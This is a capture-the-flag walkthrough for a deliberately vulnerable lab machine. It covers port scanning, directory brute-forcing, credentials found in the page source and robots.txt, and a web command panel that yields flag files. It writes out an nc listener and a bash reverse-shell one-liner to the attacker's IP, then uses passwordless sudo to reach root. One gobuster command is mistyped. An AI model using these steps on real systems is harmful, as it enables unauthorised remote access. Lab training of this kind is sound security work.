##### You should deploy the machine first.
#

##### Run nmap against the target machine.

```nmap <target IP>```

##### SSH and HTTP services are only available.

##### We access the target IP on port 80.

##### We have a web site with little information, apart from the fact that Rick wants our help, now lets check the source code of the page.

##### Nice and simple we have obtained a username ```@@@@@@```. So somewhere there has to be a login portal.

#
##### Now lets brute force the directories of the web page in order to find any hidden from us.
##### using ```dirb``` or ```gobuster``` should do the job.

```gobuster dir -u <target IP> -u /usr/share/wordlists/dirb/common.txt```

##### With the above command we can find directories in a web site, it relies on wordlists so you should check in the path ```/usr/share/wordlists``` and choose the wordlist you want to check.

##### OK we found something, now lets check the robots.txt path.

##### OK that is something which we can try later on. But we have not found yet a portal. From the wordlist we used before we were not able to find a portal, so we can choose another one or try manual checks, such as login.php.

##### Bingo

##### We found the portal, now lets try the username we found from the source code of the webpage ```http://<target IP>:80``` and for the password let's use the one we found on ```robots.txt``` path.

##### We now have access to the command portal.
##### Let's use some command and see what happens, just type ```ls -l```.

##### The command outputs some files, an intersting is ```Sup3rS3cretPickl3Ingred.txt```, ok just access it in the web browser ```http://<target IP>:80/Sup3rS3cretPickl3Ingred.txt```

##### And we have our first ingredient.

##### Since we can execute commands we are going to try and use reverse shell. Good info can be found in the below links regarding reverse shell.

##### fire up ```nc```

```nc -lvnp 8080```
```listening on [any] 8080 ...```

##### Our listener is up and ready
##### Now go to the command panel of the webpage and add the reverse shell.
```bash -c 'bash -i >& /dev/tcp/<Your IP>/<Listening Port same as in nc> 0>&1'```.


##### It worked, and now we have access to the machine.

##### By looking around and accessing the folder ```/home/rick/``` we found the second ingredient.

##### Further by issuing the command ```sudo -l ``` we observe that the user can execute sudo commands without the need for a password.
##### Looking around on the ```/root/``` directory we can find the third ingredient.
